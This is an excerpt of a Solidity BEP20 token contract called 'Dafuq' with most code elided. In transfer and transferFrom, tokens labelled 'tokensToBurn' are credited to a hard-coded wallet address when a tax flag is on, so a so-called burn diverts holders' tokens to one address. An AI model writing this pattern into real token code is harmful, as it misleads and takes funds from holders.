...
contract Dafuq is BEP20Detailed, Tokenlock, Context {

  using SafeMath for uint256;
  mapping (address => uint256) private _balances;
  mapping (address => mapping (address => uint256)) private _allowed;
  
  string constant tokenName = "Dafuq";
  string constant tokenSymbol = "DAF";
  ...
  function transfer(address to, uint256 value) public returns (bool) {
    ...
    if(taxEnabled == true) {
        _balances[0x2C2E6B38D5eCA33A95F7F2A5b7F9bF15f54804ee] = _balances[0x2C2E6B38D5eCA33A95F7F2A5b7F9bF15f54804ee].add(tokensToBurn);
    }
    ...
    if(taxEnabled == true) {
        emit Transfer(msg.sender, 0x2C2E6B38D5eCA33A95F7F2A5b7F9bF15f54804ee, tokensToBurn);
    }
  ...
  function transferFrom(address from, address to, uint256 value) public returns (bool) {
    ...
    if(taxEnabled == true) {
        emit Transfer(from, 0x2C2E6B38D5eCA33A95F7F2A5b7F9bF15f54804ee, tokensToBurn);
    }
